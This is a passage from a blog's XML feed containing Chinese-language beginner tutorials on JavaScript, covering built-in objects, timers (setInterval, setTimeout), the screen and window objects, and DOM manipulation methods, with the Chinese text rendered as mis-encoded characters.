<h2 id="å†…ç½®å¯¹è±¡"><a href="#å†…ç½®å¯¹è±¡" class="headerlink" title="å†…ç½®å¯¹è±¡"></a>å†…ç½®å¯¹è±¡</h2><ul>
<li><p>JavaScriptä¸­å¯¹è±¡åˆ†ä¸ºä¸‰ç§ï¼šè‡ªå®šä¹‰å¯¹è±¡ã€å†…ç½®å¯¹è±¡ã€æµè§ˆå™¨å¯¹è±¡ã€‚</p>
</li>
<li><p>å‰é¢ä¸¤ç§å¯¹è±¡å±äºECMAScriptï¼Œç¬¬ä¸‰ä¸ªæ˜¯JavaScriptç‹¬æœ‰çš„</p>
</li>
<li><p>å†…ç½®å¯¹è±¡æ˜¯å®˜æ–¹å®šä¹‰ï¼Œä¾›å¼€å‘äººå‘˜ä½¿ç”¨çš„å¯¹è±¡ï¼Œå®ƒèƒ½å¸®åŠ©å¼€å‘è€…å¿«é€Ÿå¼€å‘ï¼Œè€Œä¸å¿…è¦åœ¨æ„èƒŒåçš„å·¥ä½œåŸç†ï¼ˆå½“ç„¶äº†å–œæ¬¢é’»ç ”ä¹Ÿå¯ä»¥ï¼‰ã€‚</p>
</li>
<li><p>JavaScriptæä¾›äº†å¤§é‡çš„å†…ç½®å¯¹è±¡ï¼Œå¦‚Mathã€Dateã€Arrayã€Stringç­‰ã€‚</p>
</li>
<li><p>ä¸ºäº†äº†è§£å¦‚ä½•ä½¿ç”¨å†…ç½®å¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦å»<a href="https://developer.mozilla.org/zh-CN/" target="_blank" rel="noopener">å®˜ç½‘</a>æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œä¾‹å¦‚ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è·å–æ—¶é—´çš„æ–¹æ³•æ˜¯</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    nowtime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    year = nowtime.getFullYear();</span><br><span class="line">    month = nowtime.getMonth() + <span class="number">1</span>;</span><br><span class="line">    date = nowtime.getDate();</span><br><span class="line">    <span class="built_in">console</span>.log(year + <span class="string">"å¹´"</span> + month + <span class="string">"æœˆ"</span> + date + <span class="string">"æ—¥"</span> + nowtime.toLocaleTimeString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ›´æ–°æ—¶é—´é—´éš”</span></span><br><span class="line">setInterval(<span class="string">"showTime()"</span>, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>WebåŸºç¡€</category>
      </categories>
      <tags>
        <tag>JavaScriptåŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScriptè¯­æ³•ä¸‰</title>
    <url>/2020/03/16/JavaScript%E8%AF%AD%E6%B3%95%E4%B8%89/</url>
    <content><![CDATA[<h2 id="jså¯¹è±¡æ§åˆ¶CSS"><a href="#jså¯¹è±¡æ§åˆ¶CSS" class="headerlink" title="jså¯¹è±¡æ§åˆ¶CSS"></a>jså¯¹è±¡æ§åˆ¶CSS</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">        p &#123;</span><br><span class="line">            color: brown;</span><br><span class="line">            width: fit-content;</span><br><span class="line">            height: auto;</span><br><span class="line">            background-color: aquamarine;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p_id"</span>&gt;</span>è¿™æ˜¯ä¸€æ®µæµ‹è¯•çš„æ–‡å­—<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"change()"</span>&gt;</span>æ”¹å˜èƒŒæ™¯é¢œè‰²<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"p_id"</span>).style.backgroundColor = <span class="string">"#ffffff"</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>å…¶ä»–çš„æ•ˆæœç±»ä¼¼ï¼Œæ–¹æ³•éƒ½æ˜¯å…ˆæ‰¾åˆ°è¦æ”¹å˜çš„å…ƒç´ ï¼Œç„¶åè®¾ç½®æ–°çš„CSSæ ·å¼ã€‚</p>
<h2 id="è®¡æ—¶å™¨"><a href="#è®¡æ—¶å™¨" class="headerlink" title="è®¡æ—¶å™¨"></a>è®¡æ—¶å™¨</h2><h3 id="1-è®¡æ—¶äº‹ä»¶"><a href="#1-è®¡æ—¶äº‹ä»¶" class="headerlink" title="1.è®¡æ—¶äº‹ä»¶"></a>1.è®¡æ—¶äº‹ä»¶</h3><p>é€šè¿‡JavaScriptï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªéœ€è¦çš„æ—¶é—´é—´éš”ä¹‹åæ‰§è¡Œæˆ‘ä»¬çš„ä»»åŠ¡ï¼Œè€Œä¸æ˜¯åœ¨å‡½æ•°è¢«è°ƒç”¨åç«‹å³æ‰§è¡Œï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºè®¡æ—¶äº‹ä»¶ã€‚</p>
<h3 id="2-è®¡æ—¶æ–¹æ³•"><a href="#2-è®¡æ—¶æ–¹æ³•" class="headerlink" title="2.è®¡æ—¶æ–¹æ³•"></a>2.è®¡æ—¶æ–¹æ³•</h3><ol>
<li><p>setInterval(code,millisec[,â€langâ€])ï¼šé—´éš”æŒ‡å®šçš„æ¯«ç§’æ•°ä¸åœåœ°æ‰§è¡ŒæŒ‡å®šçš„ä»£ç </p>
<table>
<thead>
<tr>
<th align="left">å‚æ•°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">code</td>
<td align="left">å¿…éœ€ã€‚è¦è°ƒç”¨çš„å‡½æ•°æˆ–è¦æ‰§è¡Œçš„ä»£ç ä¸²ã€‚</td>
</tr>
<tr>
<td align="left">millisec</td>
<td align="left">å¿…é¡»ã€‚å‘¨æœŸæ€§æ‰§è¡Œæˆ–è°ƒç”¨ code ä¹‹é—´çš„æ—¶é—´é—´éš”ï¼Œä»¥æ¯«ç§’è®¡ã€‚</td>
</tr>
</tbody></table>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"time_p"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> demo_time = setInterval( <span class="string">"getTime()"</span>,<span class="number">1000</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nowDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> nowTime = nowDate.toLocaleTimeString();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"time_p"</span>).innerHTML = nowTime;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é‚£æˆ‘ä»¬æƒ³è¦åœæ­¢æ‰§è¡Œæ€ä¹ˆåŠï¼Ÿç”¨ä¸‹é¢è¿™ä¸ªæ–¹æ³•å°±å¯ä»¥äº†</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">clearInterval(demo_time);</span><br></pre></td></tr></table></figure>
</li>
<li><p>setTimeout(code,millisec[,â€langâ€])ï¼šå»¶è¿ŸæŒ‡å®šçš„æ¯«ç§’æ•°åæ‰§è¡ŒæŒ‡å®šçš„ä»£ç    </p>
<p>ä¾‹å¦‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo_time = setTimeout( <span class="string">"getTime()"</span>,<span class="number">1000</span>);<span class="comment">//ä¸€ç§’åæ‰§è¡Œä¸€æ¬¡getTime()</span></span><br></pre></td></tr></table></figure>

<p>è™½ç„¶è¯´æ˜¯æ‰§è¡Œä¸€æ¬¡ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é€’å½’è¿›è¡Œä¸æ–­è°ƒç”¨ï¼Œä»è€Œå®ç°setInterval()ç±»ä¼¼çš„æ•ˆæœï¼Œå¦‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"time_p"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"stop_time()"</span>&gt;</span>åœæ­¢è®¡æ—¶<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> demo_time;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nowDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> nowTime = nowDate.toLocaleTimeString();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"time_p"</span>).innerHTML = nowTime;</span></span><br><span class="line"><span class="actionscript">        demo_time = setTimeout( <span class="string">"getTime()"</span>,<span class="number">3000</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">stop_time</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">        clearTimeout(demo_time);</span><br><span class="line">    &#125;</span><br><span class="line">    getTime();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯â€å¯ä»¥â€œå¹¶ä¸ä»£è¡¨ç€æ¨èè¿™ä¹ˆåšï¼Œæƒ³æƒ³è°ƒç”¨å‡½æ•°çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿä¸å°±æ˜¯å‹æ ˆå—ï¼Ÿæˆ‘ä»¬æ°¸ä¸æ–­åœ°è¿›è¡Œå‹æ ˆï¼Œè€Œæ²¡æœ‰å¼¹æ ˆï¼Œè®¡ç®—æœºçš„èµ„æºä¸ä¹…å°±ä¼šè¢«æ¶ˆè€—æ®†å°½ã€‚å› æ­¤ï¼Œå¯¹äºå‘¨æœŸæ€§çš„å·¥ä½œï¼Œæˆ‘ä»¬è¿˜æ˜¯ å¼ºçƒˆæ¨èä½¿ç”¨setInterval()æ–¹æ³•ã€‚</p>
</li>
</ol>
<h2 id="åˆ©ç”¨screenå¯¹è±¡è·å–å±å¹•ä¿¡æ¯"><a href="#åˆ©ç”¨screenå¯¹è±¡è·å–å±å¹•ä¿¡æ¯" class="headerlink" title="åˆ©ç”¨screenå¯¹è±¡è·å–å±å¹•ä¿¡æ¯"></a>åˆ©ç”¨screenå¯¹è±¡è·å–å±å¹•ä¿¡æ¯</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> a_height = screen.availHeight;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> a_width = screen.availWidth;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> height = screen.height;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> width = screen.width;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"å¯ç”¨çš„å±å¹•é«˜åº¦ï¼š"</span>+a_height</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\nå¯ç”¨çš„å±å¹•å®½åº¦ï¼š"</span>+a_width</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\nå±å¹•çš„é«˜åº¦ï¼š"</span>+height</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\nå±å¹•çš„å®½åº¦ï¼š"</span>+width);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WebåŸºç¡€</category>
      </categories>
      <tags>
        <tag>JavaScriptåŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScriptè¯­æ³•äºŒ</title>
    <url>/2020/03/15/JavaScript%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="windowå¯¹è±¡"><a href="#windowå¯¹è±¡" class="headerlink" title="windowå¯¹è±¡"></a>windowå¯¹è±¡</h2><ul>
<li><p>windowå¯¹è±¡æ˜¯BOMçš„æ ¸å¿ƒï¼Œwindowå¯¹è±¡æŒ‡å½“å‰çš„æµè§ˆå™¨çª—å£</p>
</li>
<li><p>æ‰€æœ‰JavaScriptå…¨å±€å¯¹è±¡ã€å‡½æ•°ä»¥åŠå˜é‡å‡è‡ªåŠ¨æˆä¸ºwindowå¯¹è±¡çš„æˆå‘˜</p>
</li>
<li><p>å…¨å±€å˜é‡æ˜¯windowå¯¹è±¡çš„å±æ€§</p>
</li>
<li><p>å…¨å±€å‡½æ•°æ˜¯windowå¯¹è±¡çš„æ–¹æ³•<a id="more"></a></p>
</li>
<li><p>ç”šè‡³HTML DOMçš„documentä¹Ÿæ˜¯windowå¯¹è±¡çš„å±æ€§ä¹‹ä¸€</p>
</li>
<li><p>window.innerHeight ï¼šæµè§ˆå™¨çª—å£çš„å†…éƒ¨é«˜åº¦</p>
</li>
<li><p>window.innerWidth ï¼šæµè§ˆå™¨çª—å£çš„å†…éƒ¨å®½åº¦</p>
</li>
<li><p>æ‰“å¼€ä¸€ä¸ªwindowçª—å£:windows.open()</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">å‚æ•°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">URL</td>
<td align="left">ä¸€ä¸ªå¯é€‰çš„å­—ç¬¦ä¸²ï¼Œå£°æ˜äº†è¦åœ¨æ–°çª—å£ä¸­æ˜¾ç¤ºçš„æ–‡æ¡£çš„ URLã€‚å¦‚æœçœç•¥äº†è¿™ä¸ªå‚æ•°ï¼Œæˆ–è€…å®ƒçš„å€¼æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ–°çª—å£å°±ä¸ä¼šæ˜¾ç¤ºä»»ä½•æ–‡æ¡£ã€‚</td>
</tr>
<tr>
<td align="left">name</td>
<td align="left">ä¸€ä¸ªå¯é€‰çš„å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªç”±é€—å·åˆ†éš”çš„ç‰¹å¾åˆ—è¡¨ï¼Œå…¶ä¸­åŒ…æ‹¬æ•°å­—ã€å­—æ¯å’Œä¸‹åˆ’çº¿ï¼Œè¯¥å­—ç¬¦å£°æ˜äº†æ–°çª—å£çš„åç§°ã€‚å¦‚æœè¯¥å‚æ•°æŒ‡å®šäº†ä¸€ä¸ªå·²ç»å­˜åœ¨çš„çª—å£ï¼Œé‚£ä¹ˆ open() æ–¹æ³•å°±ä¸å†åˆ›å»ºä¸€ä¸ªæ–°çª—å£ï¼Œè€Œåªæ˜¯è¿”å›å¯¹æŒ‡å®šçª—å£çš„å¼•ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œfeatures å°†è¢«å¿½ç•¥ã€‚</td>
</tr>
<tr>
<td align="left">features</td>
<td align="left">ä¸€ä¸ªå¯é€‰çš„å­—ç¬¦ä¸²ï¼Œå£°æ˜äº†æ–°çª—å£è¦æ˜¾ç¤ºçš„æ ‡å‡†æµè§ˆå™¨çš„ç‰¹å¾ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œæ–°çª—å£å°†å…·æœ‰æ‰€æœ‰æ ‡å‡†ç‰¹å¾ã€‚åœ¨<a href="https://www.w3school.com.cn/jsref/met_win_open.asp#windowfeatures" target="_blank" rel="noopener">çª—å£ç‰¹å¾</a>è¿™ä¸ªè¡¨æ ¼ä¸­ï¼Œæˆ‘ä»¬å¯¹è¯¥å­—ç¬¦ä¸²çš„æ ¼å¼è¿›è¡Œäº†è¯¦ç»†çš„è¯´æ˜ã€‚</td>
</tr>
<tr>
<td align="left">replace</td>
<td align="left">ä¸€ä¸ªå¯é€‰çš„å¸ƒå°”å€¼ã€‚è§„å®šäº†è£…è½½åˆ°çª—å£çš„ URL æ˜¯åœ¨çª—å£çš„æµè§ˆå†å²ä¸­åˆ›å»ºä¸€ä¸ªæ–°æ¡ç›®ï¼Œè¿˜æ˜¯æ›¿æ¢æµè§ˆå†å²ä¸­çš„å½“å‰æ¡ç›®ã€‚æ”¯æŒä¸‹é¢çš„å€¼ï¼š<br>true - URL æ›¿æ¢æµè§ˆå†å²ä¸­çš„å½“å‰æ¡ç›®ã€‚<br>false - URL åœ¨æµè§ˆå†å²ä¸­åˆ›å»ºæ–°çš„æ¡ç›®ã€‚</td>
</tr>
</tbody></table>
<ul>
<li><p>å…³é—­ä¸€ä¸ªwindowçª—å£:windows.close()</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">closeWin</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">            myWindow.close()</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">        myWindow = <span class="built_in">window</span>.open(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'width=200,height=100'</span>)</span></span><br><span class="line"><span class="actionscript">        myWindow.document.write(<span class="string">"This is 'myWindow'"</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Close 'myWindow'"</span> <span class="attr">onclick</span>=<span class="string">"closeWin()"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶äº†ï¼Œå¦‚æœæƒ³è¦é€šè¿‡æ‰“å¼€ä¸€ä¸ªçª—å£çš„æ–¹å¼æ¥æ‰“å¼€ä¸€ä¸ªé“¾æ¥URLï¼Œæ˜¯ä¸æ¨èçš„ï¼Œå› ä¸ºæœ‰äº›æµè§ˆå™¨ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå¯èƒ½ä¼šé˜»æ­¢windows.open()æ‰“å¼€ä¸€ä¸ªURLã€‚</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200315/upP0Jok6i6zX.png" alt></p>
</li>
</ul>
<h2 id="jså¯¹è±¡æ§åˆ¶HTMLå…ƒç´ "><a href="#jså¯¹è±¡æ§åˆ¶HTMLå…ƒç´ " class="headerlink" title="jså¯¹è±¡æ§åˆ¶HTMLå…ƒç´ "></a>jså¯¹è±¡æ§åˆ¶HTMLå…ƒç´ </h2><p>æƒ³è¦è¦æ§åˆ¶å…ƒç´ ï¼Œé¦–å…ˆå°±è¦å…ˆå¾—åˆ°ï¼Œæˆ–è€…è¯´æ‰¾åˆ°è¯¥å…ƒç´ ï¼Œé€šè¿‡ä»¥ä¸‹ä¸åŒçš„å‡ ä¸ªä¸åŒçš„æ–¹æ³•ï¼Œå¯ä»¥å¾—åˆ°æˆ–è€…æ§åˆ¶HTMLå…ƒç´ ã€‚</p>
<table>
<thead>
<tr>
<th>æ–¹æ³•å</th>
<th>æ–¹æ³•æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>document.getElementsByTagName()</td>
<td>è¿”å›å¸¦æœ‰æŒ‡å®šæ ‡ç­¾åçš„å¯¹è±¡çš„é›†åˆã€‚</td>
</tr>
<tr>
<td>document.getElementById()</td>
<td>è¿”å›å¯¹æ‹¥æœ‰æŒ‡å®š ID çš„ç¬¬ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</td>
</tr>
<tr>
<td>document.getElementsByName()</td>
<td>è¿”å›å¸¦æœ‰æŒ‡å®šåç§°çš„å¯¹è±¡çš„é›†åˆã€‚</td>
</tr>
<tr>
<td>node_name.getAttribute()</td>
<td>è¿”å›æŒ‡å®šå±æ€§åçš„å±æ€§å€¼ã€‚</td>
</tr>
<tr>
<td>node_name.setAttribute()</td>
<td>æ·»åŠ æŒ‡å®šçš„å±æ€§ï¼Œå¹¶ä¸ºå…¶èµ‹æŒ‡å®šçš„å€¼ã€‚<br>å¦‚æœè¿™ä¸ªæŒ‡å®šçš„å±æ€§å·²å­˜åœ¨ï¼Œåˆ™ä»…è®¾ç½®/æ›´æ”¹å€¼ã€‚</td>
</tr>
<tr>
<td>node_name.childNodes</td>
<td>è¿”å›èŠ‚ç‚¹çš„å­èŠ‚ç‚¹é›†åˆï¼Œä»¥ NodeList å¯¹è±¡ã€‚</td>
</tr>
<tr>
<td>node_name.parentNode</td>
<td>ä»¥ Node å¯¹è±¡çš„å½¢å¼è¿”å›æŒ‡å®šèŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹</td>
</tr>
<tr>
<td>document.createElement()</td>
<td>é€šè¿‡æŒ‡å®šåç§°åˆ›å»ºä¸€ä¸ªå…ƒç´ </td>
</tr>
<tr>
<td>node_name.removeChild()</td>
<td>åˆ é™¤å½“å‰èŠ‚ç‚¹ä¸‹çš„ç‰¹å®šå­èŠ‚ç‚¹</td>
</tr>
</tbody></table>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"a_id"</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>åšå®¢<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span> <span class="attr">id</span>=<span class="string">"p_5"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p_count = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> n_count = <span class="built_in">document</span>.getElementsByName(<span class="string">"p_name"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// print:HTMLCollection(4)</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(p_count);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//é€šè¿‡ä¸‹æ ‡è®¿é—®é›†åˆä¸­çš„å…ƒç´ </span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(n_count[<span class="number">1</span>].innerHTML);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// é€šè¿‡idå¾—åˆ°å…ƒç´ </span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">"a_id"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// æŸ¥æ‰¾å…ƒç´ çš„å±æ€§</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(a.getAttribute(<span class="string">"href"</span>));</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// è®¾ç½®æ–°çš„å±æ€§å€¼</span></span></span><br><span class="line"><span class="actionscript">            a.setAttribute(<span class="string">"href"</span>, <span class="string">"https://yalexin.gitee.io/guestbook/"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"div"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// å¾—åˆ°å­èŠ‚ç‚¹é›†åˆ</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> child_list = div.childNodes;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p = <span class="built_in">document</span>.getElementById(<span class="string">"p_5"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//å¾—åˆ°çˆ¶èŠ‚ç‚¹ï¼ˆåªæœ‰ä¸€ä¸ªï¼‰</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> parent = p.parentNode;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> body = <span class="built_in">document</span>.body;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//åˆ›å»ºä¸€ä¸ªè¾“å…¥æ¡†èŠ‚ç‚¹</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> input = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span></span><br><span class="line"><span class="actionscript">            input.type = <span class="string">"text"</span>;</span></span><br><span class="line"><span class="actionscript">            input.placeholder = <span class="string">"è¿™æ˜¯é€šè¿‡createElementæ–¹æ³•åˆ›å»ºçš„"</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// å°†inputæ·»åŠ åˆ°bodyä¸­ï¼ˆåœ¨æœ«å°¾ï¼‰</span></span></span><br><span class="line">            body.appendChild(input);</span><br><span class="line"><span class="javascript">            <span 